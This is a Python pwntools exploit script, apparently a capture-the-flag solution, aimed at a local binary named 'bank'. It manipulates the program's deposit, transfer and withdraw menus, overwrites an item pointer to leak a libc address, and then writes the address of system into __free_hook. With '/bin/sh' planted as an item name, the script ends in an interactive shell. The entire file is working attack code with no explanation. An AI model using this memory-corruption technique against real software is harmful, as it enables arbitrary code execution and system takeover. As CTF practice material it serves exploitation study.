from pwn import *

r = process("./bank")

def transfer(wbflag, money):
	r.sendline("2")
	r.recvuntil("---> ")
	r.sendline(str(wbflag))
	r.recvuntil("---> ")
	r.sendline(str(money))

def deposit(wbflag, money):
	r.sendline("3")
	r.recvuntil("---> ")
	r.sendline(str(wbflag))
	r.recvuntil("---> ")
	r.sendline(str(money))

def buyItem(index):
	r.sendline("5")
	print r.recvuntil("Want?")
	r.sendline(str(index))
	print r.recvuntil("---> ")

def changeItem(index, name):
	r.sendline("6")
	print r.recvuntil("Number")
	r.sendline(str(index))
	print r.recvuntil("---> ")
	r.sendline(name)

print r.recvuntil("---> ")

deposit(1, 800)

transfer(1, 0)
transfer(1, 0)
transfer(1, 0)
r.send("4\n1\n800\n")
r.send("4\n1\n800\n")
r.send("4\n1\n1000000000000010000\n")

sleep(4.5)

for i in range(17):
	buyItem(1)

changeItem(0, "/bin/sh\x00")
changeItem(16, p64(0x602fa0))

r.sendline("1")
print r.recvuntil("Number : ")
rv = r.recv(6)
libc = u64(rv + "\x00\x00")
libc_base = libc - 0x3b660
system = libc_base + 0x456a0
free_hook = libc_base + 0x3c3788

print r.recvuntil("---> ")

changeItem(16, p64(free_hook))

r.sendline("5")
print r.recvuntil("---> ")
r.sendline("\xff")
print r.recvuntil("---> ")
r.sendline("1")

r.sendline(p64(system)[:-1])

for i in range(9):
	r.send("2\n1\n100\n")

r.interactive()
